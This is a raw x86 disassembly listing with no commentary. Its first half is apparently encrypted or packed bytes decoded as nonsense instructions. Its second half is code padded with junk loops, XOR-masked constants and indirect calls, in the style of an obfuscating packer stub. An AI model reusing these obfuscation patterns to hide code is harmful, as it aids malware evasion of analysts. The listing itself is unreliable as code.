  40574c:	mov    bh,0xba
  40574e:	jnp    0x4057aa
  405750:	pop    ebp
  405751:	or     edx,DWORD PTR [ebx+0x2e66c987]
  405757:	inc    edi
  405758:	and    al,BYTE PTR [ecx+0x1f20b2f8]
  40575e:	xchg   edx,eax
  40575f:	stos   BYTE PTR es:[edi],al
  405760:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405761:	test   eax,0x555165ad
  405766:	dec    ebp
  405767:	cmp    ah,bh
  405769:	xor    edi,DWORD PTR [esi+0x165f415b]
  40576f:	sub    BYTE PTR [ecx+0xfa17d30],ah
  405775:	and    dl,cl
  405777:	cli    
  405778:	ror    BYTE PTR [ebp+ebp*8-0x1c4585c9],cl
  40577f:	mov    ecx,0x7f783889
  405784:	push   ecx
  405785:	ins    DWORD PTR es:[edi],dx
  405786:	jae    0x405803
  405788:	mov    DWORD PTR [ebx-0x68],ecx
  40578b:	mov    esi,0x767fff1d
  405790:	or     dh,BYTE PTR [ebp+0x97e547a]
  405796:	sub    eax,0x87e49def
  40579b:	or     cl,BYTE PTR [ebx+ebp*8]
  40579e:	xchg   bl,dl
  4057a0:	sbb    esp,DWORD PTR [ecx]
  4057a2:	jmp    0xe219:0x15251073
  4057a9:	lods   al,BYTE PTR ds:[esi]
  4057aa:	adc    eax,0x6c7ef51f
  4057af:	imul   ebp,esi,0xffffffdc
  4057b2:	popf   
  4057b3:	int    0xa7
  4057b5:	push   edx
  4057b6:	jne    0x4057b2
  4057b8:	pop    ss
  4057b9:	repz imul eax,DWORD PTR [eax],0x29
  4057bd:	test   dl,ah
  4057bf:	js     0x405812
  4057c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057c2:	add    ebp,DWORD PTR [ecx]
  4057c4:	push   ss
  4057c5:	cmp    eax,0x642ea4f0
  4057ca:	mov    edi,0xf78d83d9
  4057cf:	sbb    eax,0x5bbf2623
  4057d4:	pop    eax
  4057d5:	sub    DWORD PTR [ebx],esp
  4057d7:	mov    ecx,0xaf28ff27
  4057dc:	call   0x531b:0x651e3662
  4057e3:	repz adc BYTE PTR [edi+0x6971bd62],bl
  4057ea:	dec    edx
  4057eb:	lds    edx,FWORD PTR [ecx-0x64a1ed85]
  4057f1:	hlt    
  4057f2:	xor    al,0xeb
  4057f4:	test   eax,0x7d045408
  4057f9:	cs pop esi
  4057fb:	adc    cl,BYTE PTR [edx+0x6121095f]
  405801:	mov    al,0xc5
  405803:	pop    ecx
  405804:	fs mov eax,0x718fd60e
  40580a:	xchg   esi,eax
  40580b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40580c:	fbstp  TBYTE PTR [esi+0x671424d]
  405812:	or     esp,0x81babc48
  405818:	ins    BYTE PTR es:[edi],dx
  405819:	test   al,0x5f
  40581b:	sub    esp,DWORD PTR [edx+0x1c8516e]
  405821:	jno    0x405806
  405823:	cmp    DWORD PTR [ecx+edx*4-0x10],0x990a9274
  40582b:	adc    BYTE PTR [ecx-0x16],bh
  40582e:	jmp    0xf2b41212
  405833:	and    al,0x7b
  405835:	or     al,0x8c
  405837:	xchg   bh,ch
  405839:	lds    ebp,FWORD PTR [ebx-0x47]
  40583c:	mov    al,0x3b
  40583e:	jo     0x405858
  405840:	loop   0x4057cf
  405842:	fucomp st(1)
  405844:	mov    ah,0xbe
  405846:	or     al,0x85
  405848:	dec    ebx
  405849:	aam    0xf5
  40584b:	retf   
  40584c:	jns    0x4058a8
  40584e:	sub    DWORD PTR [ecx-0x10],eax
  405851:	rcr    dh,0x63
  405854:	mov    ds:0x85ab8977,al
  405859:	pop    esp
  40585a:	pop    eax
  40585b:	in     eax,dx
  40585c:	mov    ebp,0x3c54f993
  405861:	test   DWORD PTR [eax+0x12],eax
  405864:	mov    ebx,0x1db33063
  405869:	mov    edi,0x324743bb
  40586e:	mov    ch,0x3e
  405870:	mov    ah,0xcb
  405872:	add    eax,0x14fd7288
  405877:	iret   
  405878:	xchg   edi,eax
  405879:	enter  0x9456,0xa8
  40587d:	mov    ?,WORD PTR [edi-0x6c10952b]
  405883:	xor    BYTE PTR [edi],ah
  405885:	xor    DWORD PTR [ebp+0x61],esp
  405888:	jne    0x40582f
  40588a:	jg     0x4058a8
  40588c:	add    ebp,edx
  40588e:	jb     0x405824
  405890:	sbb    BYTE PTR [ebx+0x9],dh
  405893:	mov    ch,0xb7
  405895:	xchg   edi,eax
  405896:	scas   eax,DWORD PTR es:[edi]
  405897:	sub    eax,0x74221cb7
  40589c:	add    bh,bh
  40589e:	call   0x4724:0xf3407ac
  4058a5:	add    cl,BYTE PTR [ebx]
  4058a7:	stos   BYTE PTR es:[edi],al
  4058a8:	sbb    bh,BYTE PTR [ebx+0x1cd75893]
  4058ae:	sar    DWORD PTR [edi+0xe],cl
  4058b1:	xchg   BYTE PTR [edx+ecx*4-0x73],bl
  4058b5:	inc    ebp
  4058b6:	cli    
  4058b7:	jnp    0x405845
  4058b9:	jne    0x4058dd
  4058bb:	lds    edx,FWORD PTR [edx+0x36]
  4058be:	cmp    DWORD PTR [eax],eax
  4058c0:	adc    eax,ebx
  4058c2:	leave  
  4058c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058c4:	adc    bh,BYTE PTR [edi-0x14]
  4058c7:	mov    ebp,0xb7ab8ca2
  4058cc:	xchg   esi,eax
  4058cd:	and    eax,0x32928603
  4058d2:	pushf  
  4058d3:	sub    BYTE PTR [esi+ecx*4+0x49],ch
  4058d7:	push   DWORD PTR [ebx-0x289d52ef]
  4058dd:	vpunpcklwd xmm2,xmm4,XMMWORD PTR [edi+0x9]
  4058e2:	inc    ebp
  4058e3:	cmp    cl,BYTE PTR [ebx+0x2]
  4058e6:	push   esp
  4058e7:	enter  0xb3a9,0x39
  4058eb:	mov    ?,ebp
  4058ed:	mov    ecx,ecx
  4058ef:	out    dx,eax
  4058f0:	daa    
  4058f1:	xchg   ecx,eax
  4058f2:	popa   
  4058f3:	aam    0x62
  4058f5:	shl    BYTE PTR [esi],cl
  4058f7:	sub    al,0xa0
  4058f9:	aaa    
  4058fa:	test   al,0xc9
  4058fc:	mov    esp,0x5446b068
  405901:	inc    eax
  405902:	jmp    0x334:0xed42b04b
  405909:	push   0xd7a3620
  40590e:	adc    DWORD PTR [ecx+ebx*4+0x113d7359],edi
  405915:	lods   ax,WORD PTR ds:[esi]
  405917:	rep lods al,BYTE PTR ds:[esi]
  405919:	ret    0xd9af
  40591c:	cmp    ebp,DWORD PTR [edi]
  40591e:	ds xchg edx,eax
  405920:	add    edx,DWORD PTR [eax-0x5b]
  405923:	pop    ebx
  405924:	dec    ebp
  405925:	cmp    esp,esi
  405927:	idiv   DWORD PTR [ebp+ebx*2-0xf]
  40592b:	sub    BYTE PTR [edi-0x6c],ah
  40592e:	dec    ebp
  40592f:	std    
  405930:	cmp    eax,0xff072424
  405935:	sbb    al,0xe4
  405937:	push   edi
  405938:	fld    TBYTE PTR [ebx-0x14]
  40593b:	push   0x36
  40593d:	scas   eax,DWORD PTR es:[edi]
  40593e:	int    0x47
  405940:	jno    0x405900
  405942:	xor    eax,0xd64a0495
  405947:	adc    eax,0x7419357a
  40594c:	sub    dh,0x9e
  40594f:	das    
  405950:	pop    ebx
  405951:	leave  
  405952:	stc    
  405953:	dec    esp
  405954:	out    0x64,eax
  405956:	mov    ebp,0xa5d31d48
  40595b:	or     bh,BYTE PTR [eax-0x2a9f1e6a]
  405961:	or     BYTE PTR [esi],0x67
  405964:	ja     0x405999
  405966:	aam    0xdf
  405968:	repz dec ecx
  40596a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40596b:	or     al,BYTE PTR [ebx-0x6b2ae57e]
  405971:	push   edx
  405972:	ficomp DWORD PTR [eax-0x7185afec]
  405978:	fidiv  DWORD PTR [edx+0x64]
  40597b:	xor    al,0x1c
  40597d:	pop    esp
  40597e:	push   edx
  40597f:	push   0xd14edeb2
  405984:	mov    eax,ds:0x98edd46
  405989:	sub    eax,edx
  40598b:	jg     0x405979
  40598d:	push   edx
  40598e:	outs   dx,BYTE PTR ds:[esi]
  40598f:	push   edi
  405990:	bnd es jne 0x4059f3
  405994:	ins    BYTE PTR es:[edi],dx
  405995:	mov    cl,0xf6
  405997:	out    0xd2,eax
  405999:	cmp    al,0xcc
  40599b:	or     al,0x25
  40599d:	cdq    
  40599e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40599f:	sbb    BYTE PTR [edi-0x1db5a58e],ch
  4059a5:	add    al,BYTE PTR [esi]
  4059a7:	xchg   ebx,eax
  4059a8:	mov    edx,0x6bcf1c2
  4059ad:	enter  0x7410,0x9e
  4059b1:	mov    edx,0x5b8f7942
  4059b6:	mov    edx,0x467ea64
  4059bb:	lahf   
  4059bc:	pop    esi
  4059bd:	cmp    BYTE PTR [edx+ebx*2-0x5d701073],dl
  4059c4:	dec    eax
  4059c5:	sub    al,0xf1
  4059c7:	sbb    al,0x71
  4059c9:	cmp    al,0xe
  4059cb:	aam    0x46
  4059cd:	push   cs
  4059ce:	sti    
  4059cf:	adc    dl,BYTE PTR [esi+0x1b3e3df4]
  4059d5:	cmc    
  4059d6:	in     eax,0x25
  4059d8:	cwde   
  4059d9:	hlt    
  4059da:	mov    ch,0x51
  4059dc:	arpl   WORD PTR [esi],sp
  4059de:	data16 aad 0x44
  4059e1:	out    0xc9,al
  4059e3:	test   DWORD PTR ss:[ebx-0x5],edi
  4059e7:	ret    0xda56
  4059ea:	daa    
  4059eb:	cmp    BYTE PTR [eax-0xc],cl
  4059ee:	add    cl,BYTE PTR [edx+0x37]
  4059f1:	retf   
  4059f2:	and    BYTE PTR [esp+eiz*2-0x53],dl
  4059f6:	jns    0x405a3c
  4059f8:	inc    eax
  4059f9:	sub    BYTE PTR [esi+0x60],dh
  4059fc:	test   BYTE PTR [ecx+eiz*1-0x11],0x6a
  405a01:	std    
  405a02:	dec    ecx
  405a03:	or     al,0xf9
  405a05:	hlt    
  405a06:	or     esi,DWORD PTR [edi+0x5ac1a37b]
  405a0c:	cs push ecx
  405a0e:	sbb    eax,0x3bfb68a7
  405a13:	push   esi
  405a14:	sbb    edi,DWORD PTR ds:0x1884a86c
  405a1a:	add    al,0xdd
  405a1c:	xor    esi,DWORD PTR [ecx+esi*4-0x77951497]
  405a23:	mov    bl,0x65
  405a25:	sar    DWORD PTR [esi+edi*8],1
  405a28:	pop    eax
  405a29:	sbb    eax,DWORD PTR [ebx-0xb9659af]
  405a2f:	mov    dl,BYTE PTR ds:0x3aab5ac2
  405a35:	pop    edi
  405a36:	je     0x405a74
  405a38:	inc    ebp
  405a39:	pop    ecx
  405a3a:	in     al,dx
  405a3b:	sbb    ecx,DWORD PTR [ecx-0x247f426]
  405a41:	mov    ds:0x74f2b2bd,al
  405a46:	inc    ebx
  405a47:	not    DWORD PTR [edi+0x26]
  405a4a:	inc    esi
  405a4b:	int3   
  405a4c:	xor    bh,bl
  405a4e:	dec    edi
  405a4f:	inc    edi
  405a50:	lds    edi,FWORD PTR [ecx]
  405a52:	(bad)  
  405a53:	mov    ah,bl
  405a55:	xor    eax,0xd60da53f
  405a5a:	pop    ebp
  405a5b:	push   0xffffffac
  405a5d:	not    DWORD PTR [edx+0x7b]
  405a60:	out    dx,al
  405a61:	push   ss
  405a62:	dec    ebx
  405a63:	xchg   ebx,eax
  405a64:	cli    
  405a65:	dec    edi
  405a66:	mov    WORD PTR [ebx],?
  405a68:	scas   eax,DWORD PTR es:[edi]
  405a69:	dec    ebp
  405a6a:	sub    edi,DWORD PTR ds:0x3b024f87
  405a70:	and    DWORD PTR [ecx-0x29a1d345],edi
  405a76:	pop    edx
  405a77:	mov    edx,0xe7170920
  405a7c:	xchg   edx,eax
  405a7d:	jge    0x405a2a
  405a7f:	sbb    al,0x2d
  405a81:	mov    ch,0x25
  405a83:	fsubrp st(5),st
  405a85:	pop    ss
  405a86:	xchg   edx,eax
  405a87:	jge    0x405ab5
  405a89:	sbb    bh,BYTE PTR [edx+0x36]
  405a8c:	push   0xffffffdd
  405a8e:	ret    0x74bb
  405a91:	jo     0x405a71
  405a93:	scas   eax,DWORD PTR es:[edi]
  405a94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a95:	retf   0xec4e
  405a98:	sub    al,0xca
  405a9a:	dec    esi
  405a9b:	fcom   st(0)
  405a9d:	ret    0xafc
  405aa0:	sub    DWORD PTR [ebx+0x64],0xffffffef
  405aa4:	xor    ebp,DWORD PTR [ebp-0x75e109ce]
  405aaa:	push   cs
  405aab:	cmp    ch,dl
  405aad:	mov    bh,0xf8
  405aaf:	xlat   BYTE PTR ds:[ebx]
  405ab0:	cmp    DWORD PTR [eax],ecx
  405ab2:	(bad)  
  405ab3:	scas   eax,DWORD PTR es:[edi]
  405ab4:	pushf  
  405ab5:	ret    
  405ab6:	sbb    eax,0xb4cba8b4
  405abb:	mov    eax,0xbc6c661f
  405ac0:	sbb    DWORD PTR [ebx+0x5c],0xecf6f1cf
  405ac7:	loopne 0x405a73
  405ac9:	into   
  405aca:	xor    eax,0x4ee44d14
  405acf:	in     eax,0x63
  405ad1:	cli    
  405ad2:	retf   
  405ad3:	push   esi
  405ad4:	aas    
  405ad5:	loope  0x405b40
  405ad7:	dec    ebp
  405ad8:	imul   esi,DWORD PTR [eax+0x7b0c32d8],0xd1c21143
  405ae2:	ins    BYTE PTR es:[edi],dx
  405ae3:	push   es
  405ae4:	xchg   edi,eax
  405ae5:	push   eax
  405ae6:	cwde   
  405ae7:	sbb    ecx,ebx
  405ae9:	mov    esp,0xb431e4c5
  405aee:	stos   DWORD PTR es:[edi],eax
  405aef:	ins    DWORD PTR es:[edi],dx
  405af0:	adc    ebx,ebx
  405af2:	and    DWORD PTR [edi-0x7c],0xef778050
  405af9:	jl     0x405b36
  405afb:	popf   
  405afc:	imul   edx,DWORD PTR [eax-0x72],0xc0e739f2
  405b03:	outs   dx,DWORD PTR ds:[esi]
  405b04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b05:	add    edi,DWORD PTR ds:0x531eacd3
  405b0b:	cmp    cl,BYTE PTR [edi]
  405b0d:	jp     0x405a94
  405b0f:	iret   
  405b10:	push   es
  405b11:	sbb    BYTE PTR [edi],bh
  405b13:	test   DWORD PTR [esi+0x1a],edi
  405b16:	add    esi,DWORD PTR [ecx-0x52]
  405b19:	and    DWORD PTR [eax],edx
  405b1b:	(bad)  
  405b1c:	xchg   esi,eax
  405b1d:	(bad)  
  405b1e:	fnstsw WORD PTR [edx]
  405b20:	fwait
  405b21:	dec    edi
  405b22:	mov    eax,ds:0x767b3aa5
  405b27:	mov    ds:0x7d811275,al
  405b2c:	push   0xed8199af
  405b31:	pop    edx
  405b32:	mov    WORD PTR [ebx+0x22c22a3a],?
  405b38:	jle    0x405ac4
  405b3a:	sub    eax,0x675e6fa5
  405b3f:	test   eax,0x7758a6d9
  405b44:	and    BYTE PTR [ecx-0x200daae1],bh
  405b4a:	call   0xdd7c:0x449bad76
  405b51:	mov    esi,DWORD PTR [edi-0x71]
  405b54:	dec    edi
  405b55:	add    DWORD PTR [eax-0x78],esp
  405b58:	cmp    ah,BYTE PTR [eax+0x34cff342]
  405b5e:	dec    edi
  405b5f:	bound  ecx,QWORD PTR [ecx+0x25077a38]
  405b65:	jno    0x405b80
  405b67:	xor    eax,0xa450e7b
  405b6c:	sub    DWORD PTR [ebp-0xbe8431],esp
  405b72:	inc    esi
  405b73:	lea    esi,[ecx-0x38]
  405b76:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b78:	pop    edx
  405b79:	ret    0xaaef
  405b7c:	jmp    0x19bddbaf
  405b81:	sub    BYTE PTR [ecx-0x48acade5],dh
  405b87:	(bad)  
  405b88:	jnp    0x405bb8
  405b8a:	bnd jg 0x405b98
  405b8d:	fsubr  DWORD PTR [edx+esi*1-0x68]
  405b91:	sub    BYTE PTR [ebx+0x3c7e1ba7],dl
  405b97:	mov    eax,ds:0x30a2e2f4
  405b9c:	fdiv   st(7),st
  405b9e:	out    0x55,eax
  405ba0:	(bad)  
  405ba1:	jecxz  0x405b7d
  405ba3:	ja     0x405b73
  405ba5:	cdq    
  405ba6:	jbe    0x405b90
  405ba8:	and    eax,0x1bf137d3
  405bad:	push   ds
  405bae:	call   0x68b0197a
  405bb3:	sar    DWORD PTR [ecx+edx*4-0x47],1
  405bb7:	jp     0x405be5
  405bb9:	xchg   BYTE PTR [edx+0x5c],cl
  405bbc:	mov    edi,0xbb317099
  405bc1:	push   ebp
  405bc2:	sbb    DWORD PTR [esi],edx
  405bc4:	dec    esp
  405bc5:	fcomp  DWORD PTR [ecx+0xa]
  405bc8:	out    dx,al
  405bc9:	ficomp DWORD PTR [ebx+eax*8-0x4a]
  405bcd:	mov    eax,ds:0x8febd7e8
  405bd2:	add    eax,0xf8be7d1f
  405bd7:	sbb    BYTE PTR [edx],ch
  405bd9:	test   DWORD PTR [eax+0x268c71ab],0xe86f41bc
  405be3:	ins    BYTE PTR es:[edi],dx
  405be4:	int3   
  405be5:	sub    ah,ch
  405be7:	pop    ebp
  405be8:	call   0xd80:0xae5e4a32
  405bef:	push   edi
  405bf0:	call   0x8e86b9a4
  405bf5:	jp     0x405c28
  405bf7:	jge    0x405b93
  405bf9:	jecxz  0x405c66
  405bfb:	adc    BYTE PTR [ebx],0x5a
  405bfe:	mov    ebx,es
  405c00:	call   0x89c74bb8
  405c05:	push   ebx
  405c06:	add    eax,0x12ffd9b8
  405c0b:	(bad)  
  405c0c:	je     0x405c86
  405c0e:	sbb    eax,0x5841497
  405c13:	dec    ebx
  405c14:	sbb    DWORD PTR [esi],esp
  405c16:	push   edx
  405c17:	or     BYTE PTR [esp],al
  405c1a:	push   ebp
  405c1b:	fst    QWORD PTR [esi+0x2459a3c9]
  405c21:	or     al,BYTE PTR ds:0x629b67db
  405c27:	cmp    al,0xd2
  405c29:	sub    eax,0x3b8c44f2
  405c2e:	aaa    
  405c2f:	mov    BYTE PTR [ecx-0x66],cl
  405c32:	dec    edi
  405c33:	fist   WORD PTR [eax]
  405c35:	or     eax,0xee6efb52
  405c3a:	push   ebx
  405c3b:	jb     0x405c98
  405c3d:	(bad)  
  405c3e:	xchg   ebp,eax
  405c3f:	xchg   DWORD PTR [ebx],eax
  405c41:	sub    bl,cl
  405c43:	inc    edx
  405c44:	xchg   esi,eax
  405c45:	and    bl,0x4d
  405c48:	popf   
  405c49:	jge    0x405bec
  405c4b:	rcr    BYTE PTR [edx],cl
  405c4d:	inc    edx
  405c4e:	add    bh,bh
  405c50:	xor    bh,bh
  405c52:	xor    eax,0x421d2e
  405c57:	push   DWORD PTR ds:0x421ada
  405c5d:	push   DWORD PTR ds:0x421d0e
  405c63:	push   DWORD PTR ds:0x421da2
  405c69:	push   DWORD PTR [ebp-0x30]
  405c6c:	push   DWORD PTR [ebp-0x20]
  405c6f:	mov    eax,DWORD PTR [ebp-0x8]
  405c72:	mov    eax,DWORD PTR [eax]
  405c74:	mov    eax,DWORD PTR [eax]
  405c76:	mov    eax,DWORD PTR [eax]
  405c78:	call   eax
  405c7a:	mov    eax,DWORD PTR [ebp-0x34]
  405c7d:	mov    ecx,DWORD PTR ds:0x421cd2
  405c83:	add    DWORD PTR [eax],ecx
  405c85:	pop    edi
  405c86:	pop    esi
  405c87:	leave  
  405c88:	ret    
  405c89:	push   ebp
  405c8a:	mov    ebp,esp
  405c8c:	sub    esp,0x58
  405c8f:	add    DWORD PTR ds:0x429008,0x42b004
  405c99:	push   ebx
  405c9a:	adc    DWORD PTR ds:0x42a018,0x429010
  405ca4:	push   esi
  405ca5:	push   edi
  405ca6:	and    DWORD PTR ds:0x42c00c,0x6433
  405cb0:	push   0x1f
  405cb2:	lea    eax,[ebp-0x58]
  405cb5:	push   eax
  405cb6:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405cc0:	push   0x0
  405cc2:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405ccc:	call   DWORD PTR ds:0x424034
  405cd2:	call   DWORD PTR ds:0x424004
  405cd8:	and    DWORD PTR ds:0x42a000,0x4473
  405ce2:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ce9:	and    DWORD PTR ds:0x429018,0x0
  405cf3:	mov    ebx,DWORD PTR ds:0x429018
  405cf9:	inc    ebx
  405cfa:	mov    DWORD PTR ds:0x429018,ebx
  405d00:	cmp    DWORD PTR ds:0x429018,0x1f
  405d07:	jne    0x405d1d
  405d0d:	push   0x42b00c
  405d12:	push   0x7f05
  405d17:	call   DWORD PTR ds:0x42403c
  405d1d:	cmp    DWORD PTR ds:0x429018,0x19
  405d24:	jb     0x405cf3
  405d2a:	add    ebx,DWORD PTR ds:0x42a008
  405d30:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d37:	mov    ecx,DWORD PTR [ebp-0x4]
  405d3a:	mov    ebx,0x7510893
  405d3f:	xor    ecx,ebx
  405d41:	or     DWORD PTR ds:0x42b00c,edx
  405d47:	mov    eax,0x3272db
  405d4c:	add    ecx,eax
  405d4e:	sub    DWORD PTR ds:0x42a010,0x429004
  405d58:	mov    DWORD PTR [ebp-0x1c],ecx
  405d5b:	mov    ecx,DWORD PTR [ebp+0x14]
  405d5e:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d68:	test   ecx,ecx
  405d6a:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d74:	je     0x405d92
  405d7a:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d84:	mov    ecx,DWORD PTR [ebp+0x14]
  405d87:	mov    ecx,DWORD PTR [ecx]
  405d89:	add    DWORD PTR ds:0x42a000,ecx
  405d8f:	mov    DWORD PTR [ebp-0x1c],ecx
  405d92:	and    DWORD PTR ds:0x42a010,0x0
  405d9c:	mov    edi,DWORD PTR ds:0x42a010
  405da2:	inc    edi
  405da3:	mov    DWORD PTR ds:0x42a010,edi
  405da9:	cmp    DWORD PTR ds:0x42a010,0x9
  405db0:	jne    0x405dc4
  405db6:	push   DWORD PTR [ebp-0x14]
  405db9:	push   0x423837
  405dbe:	call   DWORD PTR ds:0x424040
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x8
  405dcb:	jne    0x405dde
  405dd1:	mov    edi,DWORD PTR ds:0x42a010
  405dd7:	inc    edi
  405dd8:	mov    DWORD PTR ds:0x42a010,edi
  405dde:	cmp    DWORD PTR ds:0x42a010,0x13
  405de5:	jb     0x405d9c
  405deb:	mov    ecx,0x457a
  405df0:	imul   edx,eax
  405df3:	mov    esi,0x787f
  405df8:	or     DWORD PTR ds:0x428004,0x4238
  405e02:	add    edx,ecx
  405e04:	sbb    DWORD PTR ds:0x429014,0x4641
  405e0e:	xchg   esi,ecx
  405e10:	xor    DWORD PTR ds:0x42801c,edi
  405e16:	mov    edi,0x155c
  405e1b:	sub    edx,edi
  405e1d:	and    DWORD PTR ds:0x42901c,0x60c1
  405e27:	mov    ecx,DWORD PTR [ebp-0x4]
  405e2a:	xor    ecx,ebx
  405e2c:	and    DWORD PTR ds:0x42b014,0x0
  405e36:	mov    esi,DWORD PTR ds:0x42b014
  405e3c:	inc    esi
  405e3d:	mov    DWORD PTR ds:0x42b014,esi
  405e43:	cmp    DWORD PTR ds:0x42b014,0x10
  405e4a:	jne    0x405e5b
  405e50:	push   0x4237f6
  405e55:	call   DWORD PTR ds:0x424044
  405e5b:	cmp    DWORD PTR ds:0x42b014,0xf
  405e62:	jne    0x405e75
  405e68:	mov    esi,DWORD PTR ds:0x42b014
  405e6e:	inc    esi
  405e6f:	mov    DWORD PTR ds:0x42b014,esi
  405e75:	cmp    DWORD PTR ds:0x42b014,0x1b
  405e7c:	jb     0x405e36
  405e82:	add    ecx,eax
  405e84:	sbb    esi,0x766b
  405e8a:	mov    DWORD PTR [ebp-0x8],ecx
  405e8d:	and    esi,0x21f
  405e93:	mov    ecx,DWORD PTR [ebp-0x14]
  405e96:	mov    DWORD PTR ds:0x42b000,0x19
  405ea0:	cmp    DWORD PTR ds:0x42b000,0x0
  405ea7:	je     0x405f01
  405ead:	cmp    DWORD PTR ds:0x42b000,0x4
  405eb4:	jne    0x405ecd
  405eba:	push   DWORD PTR [ebp-0x1c]
  405ebd:	push   0x429018
  405ec2:	push   0x423a62
  405ec7:	call   DWORD PTR ds:0x424048
  405ecd:	cmp    DWORD PTR ds:0x42b000,0x5
  405ed4:	jne    0x405ee7
  405eda:	mov    esi,DWORD PTR ds:0x42b000
  405ee0:	dec    esi
  405ee1:	mov    DWORD PTR ds:0x42b000,esi
  405ee7:	xor    esi,esi
  405ee9:	add    esi,DWORD PTR ds:0x42b000
  405eef:	dec    esi
  405ef0:	mov    DWORD PTR ds:0x42b000,esi
  405ef6:	jmp    0x405ea0
  405efb:	and    esi,0x686c
  405f01:	xor    ecx,ebx
  405f03:	add    ecx,eax
  405f05:	mov    DWORD PTR [ebp-0x24],ecx
  405f08:	adc    esi,ecx
  405f0a:	mov    ecx,DWORD PTR [ebp-0x4]
  405f0d:	and    DWORD PTR ds:0x428014,0x0
  405f17:	jmp    0x405f29
  405f1c:	mov    esi,DWORD PTR ds:0x428014
  405f22:	inc    esi
  405f23:	mov    DWORD PTR ds:0x428014,esi
  405f29:	cmp    DWORD PTR ds:0x428014,0x14
  405f30:	jae    0x405f5c
  405f36:	cmp    DWORD PTR ds:0x428014,0x1d
  405f3d:	jne    0x405f51
  405f43:	push   0x42b01c
  405f48:	push   DWORD PTR [ebp-0xc]
  405f4b:	call   DWORD PTR ds:0x424014
  405f51:	jmp    0x405f1c
  405f56:	xor    DWORD PTR ds:0x428018,ecx
  405f5c:	xor    ecx,ebx
  405f5e:	add    ecx,eax
  405f60:	add    DWORD PTR ds:0x428004,edx
  405f66:	mov    DWORD PTR [ebp-0x30],ecx
  405f69:	adc    DWORD PTR ds:0x42b01c,edi
  405f6f:	mov    esi,DWORD PTR [ebp-0x4]
  405f72:	xor    DWORD PTR ds:0x42800c,0x2f0f
  405f7c:	xor    esi,ebx
  405f7e:	and    DWORD PTR ds:0x429018,0x0
  405f88:	mov    ecx,DWORD PTR ds:0x429018
  405f8e:	inc    ecx
  405f8f:	mov    DWORD PTR ds:0x429018,ecx
  405f95:	cmp    DWORD PTR ds:0x429018,0x13
  405f9c:	jne    0x405fca
  405fa2:	push   DWORD PTR [ebp-0x18]
  405fa5:	push   0x42b018
  405faa:	push   0x8bc1
  405faf:	push   0x42a018
  405fb4:	push   0x81c2
  405fb9:	push   DWORD PTR [ebp-0x18]
  405fbc:	push   0x8630
  405fc1:	push   DWORD PTR [ebp-0x28]
  405fc4:	call   DWORD PTR ds:0x424018
  405fca:	cmp    DWORD PTR ds:0x429018,0x10
  405fd1:	jb     0x405f88
  405fd7:	movzx  ecx,WORD PTR ds:0x429008
  405fde:	sub    ecx,DWORD PTR ds:0x42a010
  405fe4:	mov    DWORD PTR ds:0x429008,ecx
  405fea:	add    esi,eax
  405fec:	mov    ecx,DWORD PTR [ebp-0x24]
  405fef:	sub    ecx,eax
  405ff1:	lea    edx,[esi-0x3272db]
  405ff7:	xor    DWORD PTR ds:0x428008,0x428000
  406001:	xor    ecx,ebx
  406003:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40600d:	xor    edx,ebx
  40600f:	cmp    edx,ecx
  406011:	mov    DWORD PTR ds:0x428000,0x76f
  40601b:	je     0x4062a3
  406021:	xor    DWORD PTR ds:0x42c010,edx
  406027:	mov    ecx,DWORD PTR [ebp-0x4]
  40602a:	xor    ecx,ebx
  40602c:	or     DWORD PTR ds:0x429014,0x42a01c
  406036:	add    ecx,eax
  406038:	cmp    esi,ecx
  40603a:	mov    DWORD PTR ds:0x42a01c,0x739d
  406044:	jne    0x406280
  40604a:	add    DWORD PTR ds:0x42a00c,0x429004
  406054:	push   DWORD PTR [ebp+0x8]
  406057:	call   0x413c14
  40605c:	mov    DWORD PTR [ebp-0x18],eax
  40605f:	mov    eax,DWORD PTR [ebp-0x4]
  406062:	mov    DWORD PTR ds:0x42c00c,0x1d
  40606c:	cmp    DWORD PTR ds:0x42c00c,0x0
  406073:	je     0x4060a7
  406079:	cmp    DWORD PTR ds:0x42c00c,0x21
  406080:	jne    0x40608f
  406086:	push   DWORD PTR [ebp-0xc]
  406089:	call   DWORD PTR ds:0x42401c
  40608f:	mov    edi,DWORD PTR ds:0x42c00c
  406095:	dec    edi
  406096:	mov    DWORD PTR ds:0x42c00c,edi
  40609c:	jmp    0x40606c
  4060a1:	adc    ecx,DWORD PTR ds:0x428008
  4060a7:	mov    ecx,DWORD PTR [ebp-0x18]
  4060aa:	and    DWORD PTR ds:0x42b01c,0x0
  4060b4:	mov    edi,DWORD PTR ds:0x42b01c
  4060ba:	inc    edi
  4060bb:	mov    DWORD PTR ds:0x42b01c,edi
  4060c1:	cmp    DWORD PTR ds:0x42b01c,0x23
  4060c8:	jne    0x4060da
  4060ce:	push   DWORD PTR [ebp-0x14]
  4060d1:	push   DWORD PTR [ebp-0x28]
  4060d4:	call   DWORD PTR ds:0x424020
  4060da:	cmp    DWORD PTR ds:0x42b01c,0x19
  4060e1:	jb     0x4060b4
  4060e7:	xor    eax,ebx
  4060e9:	add    DWORD PTR ds:0x429018,0x397c
  4060f3:	mov    edi,0x3272db
  4060f8:	sub    DWORD PTR ds:0x428020,0x386b
  406102:	add    eax,edi
  406104:	mov    DWORD PTR ds:0x42900c,0x67dc
  40610e:	cmp    ecx,eax
  406110:	mov    DWORD PTR ds:0x42c00c,0x661b
  40611a:	je     0x406313
  406120:	push   DWORD PTR [ebp-0x18]
  406123:	sub    DWORD PTR ds:0x42800c,0x42a014
  40612d:	push   DWORD PTR [ebp+0x8]
